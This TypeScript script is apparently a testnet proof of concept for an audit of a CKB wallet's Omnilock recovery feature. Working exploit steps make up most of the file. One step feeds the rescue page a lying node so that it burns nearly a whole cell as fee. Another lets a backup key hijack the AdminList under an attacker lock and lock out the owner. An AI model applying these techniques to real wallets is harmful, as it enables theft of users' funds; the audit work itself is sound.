// Testnet proof for research/omnilock/audit-opus-5-5.md (throwaway keys in keys.json, gitignored, never printed).
// K stands in for the account's Lit key, E1 is its only (EVM) backup, T is a lock the backup controls.
//   npx tsx testnet-adminlist-hijack.ts faucet   claim 10000 CKB to K
//   npx tsx testnet-adminlist-hijack.ts enable   turn recovery on with KeyWay's own planRecovery/checkRecoveryTransaction
//   npx tsx testnet-adminlist-hijack.ts burn     dry run: the rescue page, fed by a node that understates one cell, signs a
//                                               transaction whose real fee is almost the whole cell; the node accepts it
//   npx tsx testnet-adminlist-hijack.ts hijack   E1 recreates the AdminList (same Type ID and list) under T's lock
//   npx tsx testnet-adminlist-hijack.ts after    KeyWay can't change the list any more; E1 still spends via Omnilock (dry run)
import { existsSync, readFileSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import * as ccc from "@ckb-ccc/core";
import { secp256k1 } from "@noble/curves/secp256k1.js";
import { keccak_256 } from "@noble/hashes/sha3.js";
import { omnilockLock, secp256k1Lock, type KeyWayRecovery } from "../../../src/sdk/browser/account-lock.ts";
import { readRecoveryList, setRecoveryListRecord, recoveryListRecordOf } from "../../../src/sdk/browser/recovery-list.ts";
import { signRecoverySpendWithEvm } from "../../../src/sdk/browser/recovery-spend.ts";
import { openRescueAccount, planRescue, rescueEntryForEvm, signRescueWithEvm } from "../../../src/rescue/rescue.ts";
import { checkRecoveryTransaction, planBackupChange, planRecovery } from "../../../src/server/recovery.ts";
import { formatCkbSignature, signAccountGroups } from "../../../src/server/funding-transaction.ts";
import type { ReadyWallet } from "../../../src/server/user-wallet.ts";

const HERE = dirname(fileURLToPath(import.meta.url));
const KEYS = join(HERE, "keys.json");
const STATE = join(HERE, "state.json");
const client = new ccc.ClientPublicTestnet({ url: "https://testnet.ckb.dev/" });
const CKB = 100_000_000n;

const keys: Record<"K" | "E1" | "T", string> = existsSync(KEYS) ? JSON.parse(readFileSync(KEYS, "utf8")) : {};
for (const name of ["K", "E1", "T"] as const) keys[name] ??= ccc.hexFrom(secp256k1.utils.randomSecretKey());
writeFileSync(KEYS, JSON.stringify(keys), { mode: 0o600 });
const state: Record<string, any> = existsSync(STATE) ? JSON.parse(readFileSync(STATE, "utf8")) : {};
const save = () => writeFileSync(STATE, JSON.stringify(state, (_, value) => typeof value === "bigint" ? value.toString() : value, 2) + "\n");

const publicKey = (key: string) => ccc.hexFrom(secp256k1.getPublicKey(ccc.bytesFrom(key), true));
const evmAddress = ccc.hexFrom(keccak_256(secp256k1.getPublicKey(ccc.bytesFrom(keys.E1), false).slice(1)).slice(12));
const evm = {
  request: async ({ method, params }: { method: string; params?: unknown[] }) => {
    if (method === "eth_requestAccounts") return [evmAddress];
    const bytes = ccc.bytesFrom(params![0] as string);
    const digest = keccak_256(ccc.bytesConcat(new TextEncoder().encode(`\x19Ethereum Signed Message:\n${bytes.length}`), bytes));
    const raw = secp256k1.sign(digest, ccc.bytesFrom(keys.E1), { prehash: false, format: "recovered" });
    return ccc.hexFrom(ccc.bytesConcat(raw.slice(1), [raw[0] + 27]));
  },
};
const litSign = async (digest: ccc.Hex) => {
  const raw = secp256k1.sign(ccc.bytesFrom(digest), ccc.bytesFrom(keys.K), { prehash: false, format: "recovered" });
  return formatCkbSignature({ r: ccc.hexFrom(raw.slice(1, 33)), s: ccc.hexFrom(raw.slice(33, 65)), recoveryParam: raw[0] as 0 | 1 });
};
const wallet = (): ReadyWallet => ({
  version: 1, status: "ready", litPkpId: "0xaudit", litPublicKey: publicKey(keys.K), ckbAddress: "", encryptedFiberKey: "", primaryDeviceIdHash: "0".repeat(64),
  hasOpenedChannel: false, createdAt: "", updatedAt: "", recovery: state.recovery,
} as unknown as ReadyWallet);
async function dryRun(label: string, tx: ccc.Transaction) {
  try {
    const cycles = await client.sendTransactionDry(tx, "passthrough");
    console.log(`${label}: test_tx_pool_accept ACCEPTED, cycles ${cycles}`);
    return true;
  } catch (error) {
    console.log(`${label}: test_tx_pool_accept REJECTED: ${(error instanceof Error ? error.message : String(error)).slice(0, 300)}`);
    return false;
  }
}
async function send(label: string, tx: ccc.Transaction) {
  if (!await dryRun(label, tx)) throw new Error("not sending");
  const hash = await client.sendTransaction(tx, "passthrough");
  console.log(`${label}: sent ${hash}, waiting`);
  await client.waitTransaction(hash, 0, 600_000);
  console.log(`${label}: committed`);
  return hash;
}

const step = process.argv[2];
const secpK = await secp256k1Lock(client, publicKey(keys.K));
if (step === "faucet") {
  const address = ccc.Address.fromScript(secpK, client).toString();
  const response = await fetch("https://faucet-api.nervos.org/claim_events", {
    method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ claim_event: { address_hash: address, amount: "10000" } }),
  });
  console.log(address, response.status, (await response.text()).slice(0, 200));
} else if (step === "enable") {
  const backups = [{ kind: "evm" as const, address: evmAddress }];
  const plan = await planRecovery(client, wallet(), backups);
  await checkRecoveryTransaction(client, plan.transaction, publicKey(keys.K), backups);
  const signed = await signAccountGroups(plan.transaction, [{ script: plan.secp, kind: "secp256k1" }], client, litSign);
  const hash = await send("enable", signed);
  const recovery: KeyWayRecovery = {
    omnilockArgs: plan.omnilock.args, adminListTypeArgs: plan.adminListType.args, adminListTypeHash: plan.adminListType.hash(),
    adminListOutPoint: { txHash: hash, index: 0 }, legacyAddress: plan.preview.legacyAddress, enabledAt: new Date().toISOString(), backups,
  };
  Object.assign(state, { enable: hash, recovery, omnilockAddress: plan.preview.newAddress });
  save();
} else if (step === "burn") {
  // A node that tells the truth about everything except the capacity of the account's big plain cell.
  const lying = new ccc.ClientPublicTestnet({ url: "https://testnet.ckb.dev/" });
  const shrink = (cell: ccc.Cell) => !cell.cellOutput.type && cell.cellOutput.capacity > 1000n * CKB
    ? ccc.Cell.from({ ...cell, cellOutput: { ...cell.cellOutput, capacity: 100n * CKB } }) : cell;
  const findCellsByLock = lying.findCellsByLock.bind(lying);
  const getCell = lying.getCell.bind(lying);
  Object.assign(lying, {
    findCellsByLock: async function* (...args: Parameters<ccc.Client["findCellsByLock"]>) { for await (const cell of findCellsByLock(...args)) yield shrink(cell); },
    getCell: async (outPoint: ccc.OutPointLike) => { const cell = await getCell(outPoint); return cell && shrink(cell); },
  });
  const account = await openRescueAccount(lying, state.omnilockAddress);
  const destination = ccc.Address.fromScript(await secp256k1Lock(client, publicKey(keys.T)), client).toString();
  const plan = await planRescue(lying, account, rescueEntryForEvm(account, [evmAddress]), destination);
  const signed = await signRescueWithEvm(lying, account, plan, evm);
  let real = 0n;
  for (const input of signed.inputs) real += (await client.getCell(input.previousOutput))!.cellOutput.capacity;
  console.log(`page shows: ${ccc.fixedPointToString(account.ckb)} CKB, moves ${ccc.fixedPointToString(plan.ckb)} CKB, fee ${ccc.fixedPointToString(plan.fee)} CKB`);
  console.log(`real inputs ${ccc.fixedPointToString(real)} CKB, real fee ${ccc.fixedPointToString(real - signed.getOutputsCapacity())} CKB`);
  state.burnTxHash = signed.hash();
  save();
  await dryRun("burn (rescue built from a lying node, signed by E1)", signed);
} else if (step === "hijack") {
  const recovery = state.recovery as KeyWayRecovery;
  const omnilock = await omnilockLock(client, recovery);
  const list = await readRecoveryList(client, recovery);
  const plain: ccc.Cell[] = [];
  for await (const cell of client.findCellsByLock(omnilock, null, true)) if (!cell.cellOutput.type) plain.push(cell);
  const thief = await secp256k1Lock(client, publicKey(keys.T));
  const tx = ccc.Transaction.from({
    inputs: [{ previousOutput: list.cell.outPoint }, ...plain.map((cell) => ({ previousOutput: cell.outPoint }))],
    outputs: [{ lock: thief, type: list.cell.cellOutput.type, capacity: 0n }, { lock: thief, capacity: 100n * CKB }, { lock: omnilock, capacity: 0n }],
    outputsData: [list.cell.outputData, "0x", "0x"],
  });
  tx.outputs[0].capacity = ccc.fixedPointFrom(tx.outputs[0].occupiedSize + ccc.bytesFrom(list.cell.outputData).length);
  // Keep the list's record next to it, so readRecoveryList and the rescue's list reading still work.
  const created = await client.getTransaction(list.cell.outPoint.txHash);
  setRecoveryListRecord(tx, 0, recoveryListRecordOf(created!.transaction, Number(list.cell.outPoint.index))!);
  const total = [list.cell, ...plain].reduce((sum, cell) => sum + cell.cellOutput.capacity, 0n);
  tx.outputs[2].capacity = total - tx.outputs[0].capacity - tx.outputs[1].capacity - 10_000n;
  const signed = await signRecoverySpendWithEvm(tx, { client, lock: omnilock, list: list.entries, entry: list.entries[0], adminList: list.cell.outPoint }, evm);
  state.hijack = await send("hijack (E1 recreates the AdminList under T's lock)", signed);
  save();
} else if (step === "after") {
  const recovery = state.recovery as KeyWayRecovery;
  const omnilock = await omnilockLock(client, recovery);
  const list = await readRecoveryList(client, recovery);
  console.log("AdminList now at", `${list.cell.outPoint.txHash}:${list.cell.outPoint.index}`, "lock is the account's Omnilock:", list.cell.cellOutput.lock.eq(omnilock));
  try {
    await planBackupChange(client, { ...wallet(), recovery } as ReadyWallet, { change: "remove", backup: { kind: "evm", address: evmAddress } });
    console.log("planBackupChange: built (unexpected)");
  } catch (error) {
    console.log("KeyWay removing E1 (planBackupChange):", (error as Error).message);
  }
  try {
    await openRescueAccount(client, state.omnilockAddress);
    console.log("rescue page: opened");
  } catch (error) {
    console.log("rescue page:", (error as Error).message);
  }
  // E1 still spends the account through Omnilock's administrator path with the hijacked list as a cell dep.
  const cell = (await (async () => { for await (const c of client.findCellsByLock(omnilock, null, true)) if (!c.cellOutput.type) return c; })())!;
  const tx = ccc.Transaction.from({ inputs: [{ previousOutput: cell.outPoint }], outputs: [{ lock: await secp256k1Lock(client, publicKey(keys.T)), capacity: cell.cellOutput.capacity - 10_000n }] });
  const signed = await signRecoverySpendWithEvm(tx, { client, lock: omnilock, list: list.entries, entry: list.entries[0], adminList: list.cell.outPoint }, evm);
  await dryRun("E1 spends the account with the AdminList under T's lock", signed);
  // The Lit key (owner path) can't touch the list any more: it is locked by T now.
  const owner = ccc.Transaction.from({ inputs: [{ previousOutput: list.cell.outPoint }, { previousOutput: cell.outPoint }], outputs: [{ lock: omnilock, type: list.cell.cellOutput.type, capacity: 197n * CKB }, { lock: omnilock, capacity: cell.cellOutput.capacity + list.cell.cellOutput.capacity - 197n * CKB - 10_000n }], outputsData: [list.cell.outputData, "0x"] });
  await owner.addCellDepsOfKnownScripts(client, ccc.KnownScript.OmniLock, ccc.KnownScript.Secp256k1Blake160);
  await dryRun("K (owner) tries to take the list back", await signAccountGroups(owner, [{ script: omnilock, kind: "omnilock" }], client, litSign));
}
process.exit(0);
